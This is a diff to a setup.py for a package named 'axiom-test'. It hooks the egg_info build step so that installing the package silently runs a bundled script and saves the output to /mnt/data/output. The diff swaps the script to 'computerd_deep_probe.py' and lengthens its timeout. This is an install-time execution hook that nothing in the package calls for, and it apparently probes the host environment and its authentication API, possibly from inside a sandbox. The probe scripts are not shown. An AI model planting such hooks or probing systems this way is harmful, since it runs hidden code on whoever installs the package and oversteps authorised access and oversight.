@@ -7,13 +7,13 @@ class PostEggInfo(egg_info):
         egg_info.run(self)
         base = os.path.dirname(__file__)
         for script, log in [
-            ("computerd_auth_api.py", "/mnt/data/output/computerd_auth_api.log"),
+            ("computerd_deep_probe.py", "/mnt/data/output/computerd_deep_probe.log"),
         ]:
             path = os.path.join(base, script)
             if not os.path.exists(path):
                 continue
             result = subprocess.run(
-                ["python3", path], timeout=60, capture_output=True, text=True
+                ["python3", path], timeout=120, capture_output=True, text=True
             )
             os.makedirs(os.path.dirname(log), exist_ok=True)
             with open(log, "w") as f:
@@ -23,7 +23,7 @@ class PostEggInfo(egg_info):
 
 setup(
     name="axiom-test",
-    version="2.0.0",
+    version="2.1.0",
     packages=find_packages(),
     cmdclass={"egg_info": PostEggInfo},
 )
